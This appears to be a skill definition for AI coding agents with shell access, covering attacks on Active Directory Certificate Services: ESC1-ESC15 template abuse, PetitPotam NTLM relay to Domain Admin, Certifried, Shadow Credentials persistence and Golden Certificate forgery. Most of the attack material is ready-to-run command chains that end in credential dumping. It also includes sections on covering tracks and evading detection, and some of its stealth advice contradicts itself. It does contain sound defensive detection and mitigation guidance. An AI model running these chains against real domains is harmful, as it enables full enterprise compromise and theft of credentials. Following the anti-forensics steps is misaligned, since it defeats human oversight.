---
name: ad-cs-abuse
description: "Active Directory Certificate Services (AD CS) abuse — ESC1-ESC15 attack patterns, PKINIT, PetitPotam to AD CS to Domain Admin chains, CVE-2022-26923 (Certifried), Shadow Credentials, Golden Certificate, certificate template ACL abuse, NTLM relay to web enrollment."
origin: kali-claw
version: "0.2.0.2"
compatibility:
  - claude-code
  - claude-sonnet-4.5
  - cursor
  - windsurf
  - openclaw
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: ad-cs-abuse
  category: enterprise-cloud
  tool_count: 13
  guide_count: 1
  mitre: "T1552-Unsecured Credentials"
  last_reviewed: "2026-07-24"
  keywords:
    - AD CS
    - PKI
    - ESC1
    - PetitPotam
    - PKINIT
    - Certipy
    - X.509
    - certificate template
    - ADCSPwn
    - CVE-2022-26923
    - Shadow Credentials
    - Golden Certificate
    - NTLM relay
---




# Skill: Active Directory Certificate Services (AD CS) Abuse

> **Supplementary Files**:
> - `payloads.md` -- Payload collection organized by ESC1-ESC15 patterns plus PetitPotam relay, Certifried, Shadow Credentials, Golden Certificate, and PKINIT abuse (60+ code blocks, 2,000+ lines)
> - `test-cases.md` -- Structured test case templates (12 cases TC-AC-001 through TC-AC-012 covering full AD CS attack surface)
> - `guides/ad-cs-abuse-playbook.md` -- Comprehensive playbook with architecture refresher, ESC pattern matrix, real-world incidents, lab setup, and defensive guidance

## Summary

AD CS abuse skill domain covering enterprise PKI compromise. Active Directory Certificate Services is Microsoft's PKI implementation and is deployed in approximately 90% of enterprise Windows environments. When misconfigured, AD CS becomes one of the most reliable paths from any domain user to Domain Admin or Enterprise Admin, often without touching the DC's LDAP/DRSUAPI interfaces that high-maturity defenders monitor for DCSync and similar attacks.

**Domain**: enterprise-cloud (AD CS / PKI)

**MITRE ATT&CK**: T1552-Unsecured Credentials, T1606-Forged Web Credentials, T1550-Use Alternate Authentication Material

## Differentiation from ad-ldap-attack

This skill is **deliberately scoped** to PKI and certificate-specific abuse. The `ad-ldap-attack` skill covers general Active Directory attacks (reconnaissance, LDAP enumeration, Kerberos attacks like AS-REP Roasting and Kerberoasting, Pass-the-Hash, DCSync, Golden/Silver Tickets, lateral movement via SMB/WMI). **This skill does not duplicate** that material.

| Topic | `ad-ldap-attack` | `ad-cs-abuse` (this skill) |
|-------|-------------------|----------------------------|
| Reconnaissance | NetBIOS, DNS, SMB, LDAP enumeration | CA discovery, template ACL audit, PKI health |
| Kerberos | AS-REP, Kerberoasting, Golden/Silver Ticket | PKINIT (RFC 4556) — cert-to-TGT |
| Credentials | NTLM hash, password, krbtgt | X.509 certs, key material, msDS-KeyCredentialLink |
| Lateral Movement | PtH, PtT, WMI, SMB | Cert-based Schannel, PKINIT auth |
| Domain Admin | DCSync via DRSUAPI | ESC1-ESC15 via certificate enrollment |
| Relay Targets | SMB, LDAP | HTTP (Web Enrollment), ICPR (RPC) |
| Post-Exploitation | GPO, delegation | Shadow Credentials, Golden Certificate |

When the engagement involves the strings `pKI-Certificate-Template`, `msPKI-`, `ENROLLEE_SUPPLIES_SUBJECT`, `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2`, `certsrv`, `certenroll`, `KeyCredentialLink`, or `PKINIT`, route through this skill rather than `ad-ldap-attack`. If both paths are in scope, chain this skill first (PKI abuse) and use harvested cert material with `ad-ldap-attack` techniques for broader domain dominance.

## Description

Active Directory Certificate Services transforms a Windows domain into a PKI-aware authentication realm. An enterprise CA published to the Configuration naming context can issue certificates that authenticate as *any principal in the forest* — including the krbtgt account, Domain Admins, and the DC machine accounts themselves — provided the requester can enroll against a template that grants them that power. The 2021 SpecterOps whitepaper "Certified Pre-Owned" catalogued fifteen classes of misconfiguration (ESC1 through ESC15) that turn a default AD CS deployment into a privilege-escalation engine. Combined with PetitPotam (CVE-2021-36942) NTLM relay coercion, an unauthenticated attacker can pivot from a single network foothold to Enterprise Admin with as few as three packets plus a forged TGT.

The attack chain typically begins with PKI enumeration via Certipy or Certify, identifying vulnerable certificate templates through their `msPKI-Certificate-Name-Flag`, `msPKI-Certificate-Policy`, Extended Key Usage (EKU), and ACL attributes. Templates flagged with `ENROLLEE_SUPPLIES_SUBJECT` (ESC1), missing or AnyPurpose EKUs (ESC2/ESC3), weak ACLs (ESC4/ESC5/ESC7), or CA-level `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` (ESC6) become the enrollment target. The attacker requests a certificate that authenticates as `administrator@domain` or a DC, then exchanges that certificate for a TGT via PKINIT, and concludes by extracting credentials from the impersonated principal.

This skill emphasises realistic Kali Linux tooling: Certipy (the ly4k Python fork, current standard), Certify and PSPKIAudit from GhostPack, ADCSPwn for relay automation, ntlmrelayx (Impacket) with `--adcs` for the HTTP-relay path, PetitPotam and Coercer for coercion, Rubeus/Kekeo for PKINIT auth on Windows footholds, Whisker/pywhisker for Shadow Credentials, and OpenSSL with certutil for X.509 parsing and verification. Each pattern includes the related KB number (e.g. KB5005413 for ESC9/ESC10), the CVE (CVE-2021-36942 for PetitPotam, CVE-2022-26923 for Certifried), and the detection telemetry defenders should expect (Event IDs 4886, 4887, 48865, 4768 with certificate pre-auth).

## Use Cases

1. **AD CS Security Assessment** -- During an authorized internal engagement, enumerate every published certificate template, audit ACLs against BloodHound-derived group membership, and demonstrate ESC1-ESC15 impact through certificate enrollment to a privileged target.
2. **PetitPotam to Domain Admin chain** -- From an unauthenticated network position, coerce DC authentication to a relay listener, relay NTLM to AD CS Web Enrollment, obtain a DC certificate, PKINIT to a TGT, and dump domain credentials via PKINIT TGT to DCSync-class tooling.
3. **Certifried (CVE-2022-26923) Exploitation** -- On patched-but-unhardened DCs, leverage the machine-account / DNS-host-name mismatch to obtain a certificate that authenticates as any domain-joined machine, including DCs, bypassing the post-KB5005413 SubjectSid hardening.
4. **Shadow Credentials Persistence** -- After compromising a single user with `WriteAccountRestrictions` or equivalent ACL on a target, write a `msDS-KeyCredentialLink` value via Whisker/pywhisker and persist cert-based access that survives password resets.
5. **Golden Certificate Forgery** -- After extracting the CA private key (from the CA's `*.pfx` export, DPAPI-protected machine key, or `certsrv` database), forge arbitrary certificates offline for any principal, mirroring Golden Ticket semantics for PKI-backed authentication.
6. **PKI Hardening Review (Defensive Engagement)** -- Audit an enterprise CA deployment for the full ESC1-ESC15 matrix, validate Web Enrollment Kerberos enforcement, recommend HSM-backed CA keys, and produce a remediation matrix mapping each finding to its Microsoft documentation reference.

## Core Tools

| Tool | Category | Purpose |
|------|----------|---------|
| Certipy (ly4k fork) | Enumeration + Abuse | Modern Python AD CS attack suite — `certipy find`, `certipy req`, `certipy auth`, `certipy ca`, `certipy account`, `certipy template` |
| Certify (GhostPack / HarmJ0y) | Enumeration + Abuse | C# AD CS enumeration and abuse — `Certify.exe find /vulnerable`, `Certify.exe request`, runs in-memory via Cobalt Strike execute-assembly |
| PSPKIAudit / PSPKI module | Enumeration | PowerShell module — `Get-CATemplate`, `Invoke-AADCSPwn` wrappers, ACL audit |
| ADCSPwn (bsbedo) | Relay Automation | End-to-end ESC8 automation — coercer + relay + cert request + PKINIT in one tool |
| ntlmrelayx (Impacket) | NTLM Relay | Impacket relay listener with `--adcs` and `--template` flags for ESC8 / ESC11 |
| PetitPotam (CVE-2021-36942 PoC) | Authentication Coercion | Anonymous LSARPC coercion via `MS-EFSRPC` `EfsRpcOpenFileRaw` — forces DC$ to authenticate to attacker |
| Coercer | Authentication Coercion | Multi-method coercer — sweeps `MS-EFSRPC`, `MS-RPRN`, `MS-DFSNM`, `MS-EVEN` for any path that triggers machine auth |
| Rubeus (GhostPack) | PKINIT / Kerberos | Windows Kerberos attack toolkit — `Rubeus asktgt /certificate:`, `Rubeus asktgs`, `Rubeus dump`, `Rubeus tgtdeleg` |
| Kekeo (GentilKiwi) | PKINIT / Golden Cert | Mimikatz sibling — `tgt::ask /pfx:`, `kerberos::ptt`, full PKINIT client implementation |
| Whisker (Elad Shamir) | Shadow Credentials | C# tool to abuse `msDS-KeyCredentialLink` — `Whisker add /target:`, `Whisker list`, `Whisker remove` |
| pywhisker (ShutdownRepo) | Shadow Credentials | Python port of Whisker — same operations, runs from Kali without Windows foothold |
| X509 Cert Examiner / OpenSSL | X.509 Parsing | Decode ASN.1 DER cert structures — `openssl x509 -in cert.pem -text -noout`, `openssl pkcs12 -info`, verify EKU/SAN/issuer chains |
| certutil / pkiview.msc / Microsoft PKI Health | Native Inspection | Windows-native CA inspection — `certutil -template`, `certutil -catemplates`, `pkiview.msc` for CA health and AIA/CDP validation |

## Methodology

### Phase 1: PKI Discovery and CA Mapping

Identify Enterprise CAs, Standalone CAs, Web Enrollment endpoints, and enrollment services via LDAP, RPC, and HTTP reconnaissance.

1. LDAP query the Configuration partition for `pKIEnrollmentService` objects to locate CAs and their `dNSHostName`, certificate templates (`certificateTemplates`), and CA certificate blobs
2. Identify Web Enrollment endpoints by probing `http://<ca>/certsrv/` and inspecting the `Default.aspx` enrollment UI
3. Confirm CA type (Enterprise vs Standalone) by querying the `configurationNamingContext` for CA objects and reading `flags` and `CA Name`
4. Map CA trust chains via `pkiview.msc` or `openssl verify` against the NTAuthStore and Root CA store

### Phase 2: Template Enumeration and ESC Classification

Pull every published template and classify against the ESC1-ESC15 matrix by inspecting flags, EKUs, issuance requirements, and ACLs.

1. Run `certipy find` / `Certify find` against the domain to extract template metadata and ACLs
2. Filter for templates where `msPKI-Certificate-Name-Flag` includes `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (0x1) — ESC1 candidates
3. Inspect `pKIExtendedKeyUsage` for AnyPurpose, no EKU, PKINIT KDC, or Client Authentication — ESC2/ESC3/ESC13 candidates
4. Resolve ACLs and flag templates where a principal the attacker controls holds `WriteOwner`, `WriteDacl`, `WriteProperty`, or `GenericAll` — ESC4 candidates
5. Inspect CA-level flags (`EDITF_ATTRIBUTESUBJECTALTSSUBJECT2`, `EDITF_DISABLEEXTENSIONLIST`) — ESC6 candidates
6. Inspect CA ACLs for `ManageCA` / `ManageCertificates` held by non-admins — ESC5/ESC7 candidates

### Phase 3: Certificate Request and Privilege Escalation

Enroll against a classified-vulnerable template to obtain a certificate that authenticates as a privileged principal.

1. Build enrollment request via `certipy req -ca '<CA-Name>' -template '<Template>' -upn 'administrator@domain' -dns 'dc01.domain'`
2. For ESC1, supply `-san` with the target UPN; for ESC6, supply `-san` even on standard templates because the CA flag honours it
3. For ESC4/ESC5/ESC7, first modify the template or CA with `certipy template -save-old` / `certipy ca` to add attacker-controlled flags, then enroll
4. Verify the issued cert decodes with `openssl x509 -text` and that the SAN, EKU, and subject match the impersonation target

### Phase 4: PKINIT Authentication to TGT

Exchange the issued certificate for a Kerberos TGT via PKINIT (RFC 4556), then use the TGT for standard Kerberos attacks.

1. Run `certipy auth -pfx admin.pfx -dc-ip <DC>` to obtain a `.ccache` TGT for the impersonated principal
2. On Windows footholds, run `Rubeus asktgt /user:administrator /certificate:admin.pfx /password:... /domain:... /dc:... /ptt`
3. Validate the resulting TGT contains the `PA-PK-AS-REP` pre-auth type (16) via `klist` or `Decode-Ticket`
4. Convert the TGT to a usable form (`export KRB5CCNAME=admin.ccache`) for Impacket tools

### Phase 5: Credential Harvesting and Persistence

Leverage the elevated TGT for domain dominance and establish persistent PKI-based access.

1. Run `secretsdump.py -k -no-pass administrator@dc01.domain` to dump NTDS via the PKINIT-derived TGT
2. Establish Shadow Credentials persistence on high-value targets via `pywhisker add --target "dc01$"`
3. Forge a Golden Certificate if the CA private key is recoverable — `certipy forge -ca-pfx <ca-cert> -upn administrator -subject 'CN=Administrator,CN=Users,DC=...'`
4. Cover tracks by removing enrollment records from the CA database where possible and timing attacks outside the CA audit window

## Practical Steps

### Step 1: Discover Enterprise CAs via LDAP

```bash
# Locate all Enterprise CAs in the Configuration partition
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=pKICertificateTemplate)" cn displayName

# Locate the CA enrollment endpoints
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
  "(objectclass=pKIEnrollmentService)" cn dNSHostName certificateTemplates

# Probe Web Enrollment endpoint
curl -sk http://ca01.corp.local/certsrv/ | head -20
```

### Step 2: Run Certipy Enumeration

```bash
# Install / upgrade Certipy (ly4k fork)
python3 -m pip install --upgrade certipy

# Vulnerable template scan with BloodHound-style output
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -vulnerable

# Text + JSON output for offline analysis
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -old-bloodhound -text -json

# Targeted lookup for a specific template
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -enabled
```

### Step 3: ESC1 -- SAN Abuse with ENROLLEE_SUPPLIES_SUBJECT

```bash
# Identify ESC1 templates (ENROLLEE_SUPPLIES_SUBJECT = 0x1)
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -vulnerable | grep -A5 ESC1

# Request a cert authenticating as administrator via SAN
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'VulnTemplate' \
  -san 'administrator@corp.local'

# Authenticate with the resulting PFX to obtain a TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

### Step 4: ESC8 -- PetitPotam to AD CS Relay Chain

```bash
# Terminal 1: start ntlmrelayx targeting AD CS Web Enrollment
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support \
  --adcs --template 'DomainController'

# Terminal 2: coerce the DC to authenticate to the relay
python3 PetitPotam.py -u '' -p '' -d corp.local \
  10.10.0.100 10.10.0.1     # attacker_IP DC_IP

# Terminal 3: with the relayed base64 PFX, PKINIT to a TGT
certipy auth -pfx <base64_pfx> -dc-ip 10.10.0.1 -ns 10.10.0.1 -dns corp.local

# Use the TGT for secretsdump
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

### Step 5: ESC4 -- Template ACL Modification

```bash
# Save the current template state, then make it ESC1-equivalent
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' -save-old

# Now request against the modified template (it now has ENROLLEE_SUPPLIES_SUBJECT)
certipy req -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'WritableTemplate' \
  -san 'administrator@corp.local'

# Restore the original template state for stealth
certipy template -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 \
  -template 'WritableTemplate' -configuration WritableTemplate.json
```

### Step 6: Shadow Credentials Persistence

```bash
# Write a KeyCredentialLink to a target via pywhisker
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'DC01$' --action 'add'

# Use the resulting PFX to PKINIT as the DC machine account
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1

# List existing KeyCredentialLinks (recon)
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'Administrator' --action 'list'

# Remove the KeyCredentialLink to cover tracks
pywhisker.py -d corp.local -u 'svc_ldap' -p 'Password123!' \
  --target 'DC01$' --action 'remove' --device-id <KeyId>
```

## Defense Perspective

### Detecting AD CS Abuse

- **Template enumeration** -- Monitor Event ID 4886 (Certificate Services received a certificate request) and 4887 (Certificate Services approved a certificate request) for unusual requestors or templates. High-volume enumeration will trigger 4662 (directory service access) on the Configuration partition.
- **ESC1 requests** -- Audit issued certificates (CA database Event 4886/4887) for SAN values that do not match the requester's sAMAccountName or UPN. The CA log itself records the requested subject and SAN.
- **ESC8 relay chain** -- The PetitPotam coercion appears as Event ID 4624 (anonymous logon type 3) from the DC's own IP to the attacker followed immediately by Event 4768 (TGT request via PKINIT) on the DC. Web Enrollment shows Event 4886 with a requestor from a different host than typical.
- **PKINIT auth** -- Event 4768 (TGT request) with pre-auth type 16 (PA-PK-AS-REP) is rare in non-PKI-heavy environments. Alert on any PKINIT TGT request for privileged accounts unless expected (service accounts with smart cards).
- **Shadow Credentials** -- Event 4662 modify on `msDS-KeyCredentialLink` (attribute ID `5cb47ed8-8b67-4947-b91e-5f6e0bbe2c1a`) is a high-signal detection. Microsoft Defender for Identity raises a "Suspicious modification of a KeyCredentialLink" alert.
- **Golden Certificate** -- A certificate presented to PKINIT that does not appear in the CA database (Event 4886) is a forgery indicator. Compare PKINIT-presented serial numbers against CA database records.

### Mitigations per ESC Pattern

- **ESC1, ESC2, ESC3** -- Remove `ENROLLEE_SUPPLIES_SUBJECT` from any template with Client Authentication or PKINIT KDC EKU. Restrict enrollment to narrowly-scoped groups. Apply KB5014754 ("patch Tuesday" hardening, May 2022) which adds strong certificate mapping enforcement.
- **ESC4, ESC5, ESC7** -- Audit template and CA ACLs quarterly. Remove `GenericAll`, `WriteDacl`, `WriteOwner`, and `WriteProperty` from any non-admin principal. `ManageCA` and `ManageCertificates` should be restricted to Domain Admins / Enterprise Admins only.
- **ESC6** -- Disable `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` on the CA via `certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` and restart Certificate Services.
- **ESC8** -- Disable AD CS Web Enrollment entirely (preferred) or enforce Windows Integrated Authentication with Extended Protection for Authentication (Channel Binding Tokens). Deploy EPA on the `certsrv` IIS application.
- **ESC9, ESC10** -- Apply KB5005413 (August 2021) which enforces subject SID mapping. Move to strong certificate mapping mode (`FullEnforce` from November 2023) under `HKLM\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters\StrongCertificateBindingEnforcement = 2`.
- **ESC11** -- Block unauthenticated RPC to the ICPR interface. Enforce RPC sealing on the CA via `certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICSPREQUEST`.
- **PetitPotam / coercion** -- Disable SMB signing bypass (enforce SMB signing on all DCs) and block MS-EFSRPC at the host firewall. The mitigation for CVE-2021-36942 is patch-level upgrade to the August 2021 CU.

### Hardening Recommendations

- Deploy the CA private key on an HSM (Hardware Security Module) so that even CA administrators cannot extract the key. This neutralises Golden Certificate attacks at the root.
- Use offline Root CA with online Issuing CAs (three-tier hierarchy) so compromise of the Issuing CA does not grant forest-root trust.
- Enforce strong certificate mapping (KB5014754 Auditing mode -> Full Enforce) so that ESC1 and ESC10 certificates without proper SID mapping fail authentication.
- Audit template ACLs with `PSPKIAudit` or Certipy in CI / weekly cadence and alert on any change.
- Disable Web Enrollment unless explicitly required. Preferably use the native MMC enrollment or modern CES/CEP (Certificate Enrollment Policy / Certificate Enrollment Service) endpoints with Kerberos authentication.
- Implement lateral movement detection (Microsoft Defender for Identity or equivalent) that alerts on machine-account NTLM authentication from DC to internal hosts (a classic PetitPotam tell).

## Key References

- **Certified Pre-Owned** -- Will Schroeder (@harmj0y), Lee Christensen (@tifkin_), Matt Creel, SpecterOps, June 17, 2021. The foundational ESC1-ESC8 catalogue.
- **Certified Pre-Owned Abusing Active Directory Certificate Services** -- Black Hat USA 2021 training companion paper.
- **PetitPotam** -- Gilles Lionel (@topotam77), July 2021. CVE-2021-36942 PoC for anonymous MS-EFSRPC coercion.
- **Certifried (CVE-2022-26923)** -- Yair Mizrahi (@yairmx8), Amplify Security, May 2022. Microsoft PKI registration abuse via DNS-host-name mismatch.
- **Shadow Credentials** -- Elad Shamir (@elad_shamir), September 2021. `msDS-KeyCredentialLink` abuse via PKINIT.
- **AD CS attack theory update (ESC9-ESC15)** -- Oliver Lyak (@ly4k), Certipy documentation and release notes, 2022-2024.
- **KB5005413** -- Microsoft, August 2021. Strong certificate mapping for ESC9/ESC10 mitigation.
- **KB5014754** -- Microsoft, May 2022. Strong mapping enforcement timeline (Audit -> Full Enforce November 2023).

## Tool Installation Reference

```bash
# Certipy (ly4k fork) — primary Kali tool
python3 -m pip install --upgrade certipy
# Verify
certipy --version

# pywhisker — Shadow Credentials from Kali
python3 -m pip install --upgrade pywhisker

# PetitPotam — anonymous MS-EFSRPC coercion
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam && python3 -m pip install -r requirements.txt

# Coercer — multi-method coercion framework
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer && python3 -m pip install -r requirements.txt

# Impacket — ntlmrelayx with --adcs
python3 -m pip install --upgrade impacket
# Verify the AD CS relay flag is present
ntlmrelayx.py --help | grep -A2 adcs

# ADCSPwn — all-in-one ESC8 chain
git clone https://github.com/bats3c/ADCSPwn.git
cd ADCSPwn && python3 -m pip install -r requirements.txt

# OpenSSL — cert parsing (already on Kali)
openssl version

# PSPKIAudit / PSPKI module — requires Windows PowerShell
# Install on a Windows foothold or via dotnet on Kali
# Install-Module -Name PSPKI -Scope CurrentUser
```

## ESC Pattern Quick Decision Matrix

| Scenario | Path | Tool | Notes |
|----------|------|------|-------|
| Authenticated domain user, want to read templates | ESC1-ESC7 scan | `certipy find -vulnerable` | Cheapest path |
| Template has `ENROLLEE_SUPPLIES_SUBJECT` + Client Auth EKU | ESC1 | `certipy req -san` | Direct escalation |
| Template has AnyPurpose or no EKU | ESC2 | `certipy req` then chain | Often pairs with ESC1 |
| Template has PKINIT KDC EKU and Domain Computers can enroll | ESC3 / KDC cert | `certipy req` then impersonate DC | High impact |
| You hold `WriteDacl` on a template | ESC4 | `certipy template -save-old` then modify | Restore after use |
| You hold `ManageCA` on the CA | ESC7 | `certipy ca` to flip flags | SubCA path |
| CA has `EDITF_ATTRIBUTESUBJECTALTSSUBJECT2` flag | ESC6 | `certipy req -san` on any template | Global SAN flag |
| Unauthenticated network position | ESC8 | PetitPotam + ntlmrelayx --adcs | DC$ to DA chain |
| Post-KB5005413, strong mapping in Audit mode | ESC9 / ESC10 | SubjectSid / no security extension | Often paired with Certifried |
| Need persistent backdoor | Shadow Credentials | `pywhisker add` | Survives password reset |
| Have CA private key (PFX) | Golden Certificate | `certipy forge` | Forgery offline |
| CA patched (post-Aug 2022) but machine cert path open | CVE-2022-26923 Certifried | `certipy req` with machine DNS attr | Bypasses SID binding |

## Detection Methods

### ADCS Specific Event IDs
- **Event ID 4886**: Certificate Services received a certificate request.
- **Event ID 4887**: Certificate Services approved a certificate request; maps request to issued serial.
- **Event ID 4885**: Certificate Services received a certificate revocation request.
- **Event ID 5136**: Directory service object modified (template change = ESC4/ESC5/ESC7).
- **Event ID 4662**: KeyCredentialLink attribute write (Shadow Credentials).
- **Event ID 4768** (pre-auth type 16): PKINIT TGT request via certificate authentication.

### Behavioral Indicators
- **ESC1 exploitation**: User requests certificate for template with `ENROLLEE_SUPPLIES_SUBJECT` flag using different user SAN; correlate 4886/4887 requests.
- **ESC4/5/7 modification**: Template ACL/flag changes followed by enrollment; spike in 5136 events.
- **ESC8 NTLM relay**: IIS logs at CA's `certsrv` virtual directory showing NTLM auth (vs expected Kerberos).
- **PKINIT anomalies**: Multiple TGT requests with pre-auth type 16 from same user; rare in mature environments.

### SIEM Detection Rules
- **Splunk SPL**: `index=ad sourcetype=XmlWinEventLog:Security EventCode=4887 | stats count by TemplateName by RequesterName`
- **Sigma rule**: `sigma/rules/windows/ad_cs_abuse.yml`
- **Microsoft Defender for Identity**: Native alerts for Shadow Credentials, ESC1, ESC8 patterns.
- **Certipy audit mode**: Run `certipy find -vulnerable` against your own CA; map results to detection rules.

## Defense Evasion Techniques

> **See also**: `## Anti-Forensics and OPSEC Considerations` above for detailed OPSEC notes per ESC technique.

### Template Modification Stealth
- **Save and restore**: Use `certipy template -save-old` to capture original state, restore after enrollment (Event 5136 spike avoided).
- **Single-action edits**: Batch template changes into a single modification; multiple 5136 events over short window is suspicious.
- **Reuse existing vulnerable templates**: Prefer ESC1 templates over ESC4 modifications (no modification = no 5136 events).
- **Time-shift**: Make modifications during scheduled change windows (legitimate-looking).

### PKINIT Stealth
- **Single TGT per engagement**: Avoid repeated PKINIT TGT requests; reuse one TGT via pass-the-ticket.
- **Distribute across accounts**: Use multiple compromised accounts rather than one for PKINIT.
- **Off-hours requests**: Make PKINIT requests during peak business hours (rare-events blend in normal noise).

### ESC8 NTLM Relay Stealth
- **Use existing HTTP endpoints**: Relay to legitimate IIS apps rather than `certsrv` directly.
- **Avoid auth rate limits**: Pace relay attempts; rapid NTLM auths from one source is suspicious.
- **Use PrinterBug / PetitPotam**: Trigger NTLM from legitimate services (lsass, spoolsv) rather than attacker-controlled binaries.

## Anti-Forensics and OPSEC Considerations

- **CA database records persist** -- Every issued certificate is recorded in the CA database (`certsrv.edb`) and viewable via `certutil -view`. Backdating, deleting, or manipulating CA database records requires CA Database Administrator (`ManageCA`) and is itself a high-signal alert.
- **Event IDs 4886 / 4887** -- These Certificate Services request / issued events record the requester's identity, the template used, and the resulting serial number. Map these to your engagement window.
- **PKINIT TGT events** -- Event 4768 with pre-auth type 16 is rare; defenders who profile PKINIT usage will see the spike. Stagger TGT requests and prefer long-lived TGTs obtained once per engagement.
- **Template modification** -- ESC4 / ESC5 / ESC7 require template or CA modifications. Use `certipy template -save-old` to capture the original state and restore after the request. Modification events are Event 5136 (directory service object modified) and are audited by default.
- **Web Enrollment logs** -- ESC8 leaves IIS logs at the CA's `certsrv` virtual directory. These are stored in `%SystemRoot%\System32\LogFiles\W3SVC1\` and are often not aggressively rotated. Time-box engagements.
- **KeyCredentialLink writes** -- Shadow Credentials writes generate Event 4662 with the KeyCredentialLink attribute GUID. Microsoft Defender for Identity raises a built-in alert on this pattern; assume any Shadow Credentials write will trigger an alert in mature environments.

## Scope Boundaries

This skill does **not** cover:

- General AD reconnaissance, LDAP enumeration, Kerberos (AS-REP / Kerberoasting / PtH / DCSync) -- see `ad-ldap-attack`
- Azure AD / Entra ID certificate-based authentication -- see `cloud-identity-attack`
- Smart card / TPM-based client authentication hardware -- out of scope for offensive tooling
- TLS server certificate abuse (IIS / Exchange / AD FS) -- see `cms-framework-attack` and `api-security`
- Code signing certificate abuse for malware -- see `av-edr-evasion` and `payload-generation`

If the engagement crosses into any of these, chain the relevant skill in sequence.
